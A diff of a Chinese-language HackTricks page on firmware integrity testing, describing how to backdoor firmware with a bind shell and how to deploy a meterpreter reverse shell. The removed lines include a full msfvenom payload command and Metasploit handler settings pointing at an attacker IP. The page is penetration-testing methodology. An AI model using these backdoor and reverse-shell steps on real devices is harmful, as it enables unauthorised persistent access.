@@ -1,62 +1,58 @@
 <details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直到成为英雄！</strong></summary>
+<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>
 
-支持HackTricks的其他方式：
+支持 HackTricks 的其他方式：
 
-* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
 
 </details>
 
+# 固件完整性
 
-### 本页面内容复制自 [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+**可以上传自定义固件和/或编译后的二进制文件来利用完整性或签名验证漏洞**。可以按照以下步骤进行后门绑定 shell 编译：
 
-尝试**上传自定义固件和/或编译后的二进制文件**，检查完整性或签名验证漏洞。例如，使用以下步骤编译一个在启动时运行的后门绑定shell。
+1. 可以使用 firmware-mod-kit (FMK) 提取固件。
+2. 应识别目标固件架构和字节序。
+3. 可以使用 Buildroot 或其他适合的方法为环境构建交叉编译器。
+4. 可以使用交叉编译器构建后门。
+5. 可以将后门复制到提取的固件 /usr/bin 目录。
+6. 可以将适当的 QEMU 二进制文件复制到提取的固件 rootfs。
+7. 可以使用 chroot 和 QEMU 模拟后门。
+8. 可以通过 netcat 访问后门。
+9. 应从提取的固件 rootfs 中移除 QEMU 二进制文件。
+10. 可以使用 FMK 重新打包修改后的固件。
+11. 可以通过使用固件分析工具包 (FAT) 模拟后门固件并使用 netcat 连接到目标后门 IP 和端口来测试后门固件。
 
-1. 使用固件修改工具包（FMK）提取固件
-2. 确定目标固件的架构和字节序
-3. 使用Buildroot构建交叉编译器或使用适合您环境的其他方法
-4. 使用交叉编译器构建后门
-5. 将后门复制到提取的固件的/usr/bin目录
-6. 将适当的QEMU二进制文件复制到提取的固件rootfs
-7. 使用chroot和QEMU模拟后门
-8. 使用netcat连接到后门
-9. 从提取的固件rootfs中移除QEMU二进制文件
-10. 使用FMK重新打包修改后的固件
-11. 通过使用固件分析工具包（FAT）模拟后门固件并使用netcat连接到目标后门IP和端口来测试后门固件
+如果已经通过动态分析、引导程序操作或硬件安全测试获得了 root shell，则可以执行预编译的恶意二进制文件，如植入物或反向 shell。可以使用以下步骤利用 Metasploit 框架和 'msfvenom' 等自动化 payload/植入工具：
 
-如果已经通过动态分析、引导程序操作或硬件安全测试等手段获得了root shell，尝试执行预编译的恶意二进制文件，如植入物或反向shell。考虑使用用于命令和控制（C&C）框架的自动化payload/植入工具。例如，可以使用Metasploit框架和'msfvenom'，按照以下步骤操作。
+1. 应识别目标固件架构和字节序。
+2. Msfvenom 可用于指定目标 payload、攻击者主机 IP、监听端口号、文件类型、架构、平台和输出文件。
+3. 可以将 payload 传输到受损设备，并确保它具有执行权限。
+4. Metasploit 可以通过启动 msfconsole 并根据 payload 配置设置来准备处理传入请求。
+5. 可以在受损设备上执行 meterpreter 反向 shell。
+6. 可以监控 meterpreter 会话的开启情况。
+7. 可以执行后期利用活动。
 
-1. 确定目标固件的架构和字节序
-2. 使用`msfvenom`指定适当的目标payload (-p)，攻击者主机IP (LHOST=)，监听端口号 (LPORT=)，文件类型 (-f)，架构 (--arch)，平台 (--platform linux或windows)，以及输出文件 (-o)。例如，`msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
-3. 将payload传输到被攻陷的设备（例如，运行一个本地web服务器并使用wget/curl将payload下载到文件系统），并确保payload具有执行权限
-4. 准备Metasploit来处理传入请求。例如，使用msfconsole启动Metasploit，并根据上述payload设置以下参数：使用exploit/multi/handler，
-* `set payload linux/armle/meterpreter_reverse_tcp`
-* `set LHOST 192.168.1.245 #攻击者主机IP`
-* `set LPORT 445 #可以是任何未使用的端口`
-* `set ExitOnSession false`
-* `exploit -j -z`
-5. 在被攻陷的设备上执行meterpreter反向🐚
-6. 观察meterpreter会话开启
-7. 进行后期利用活动
+如果可能，可以利用启动脚本中的漏洞来获得对设备的持久访问权限，跨重启。当启动脚本引用、[符号链接](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)或依赖于位于不受信任的挂载位置（如用于存储根文件系统之外数据的 SD 卡和闪存卷）中的代码时，就会出现这些漏洞。
 
-如果可能的话，识别启动脚本中的漏洞，以在设备重启后获得持久访问权限。当启动脚本引用、[符号链接](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)或依赖于位于不受信任的挂载位置（如用于存储根文件系统之外数据的SD卡和闪存卷）中的代码时，就会出现此类漏洞。
-
+# 参考资料
+* 欲了解更多信息，请查看 [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 
 <details>
 
-<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击直到成为英雄！</strong></summary>
+<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>
 
-支持HackTricks的其他方式：
+支持 HackTricks 的其他方式：
 
-* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
+* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。
 
 </details>
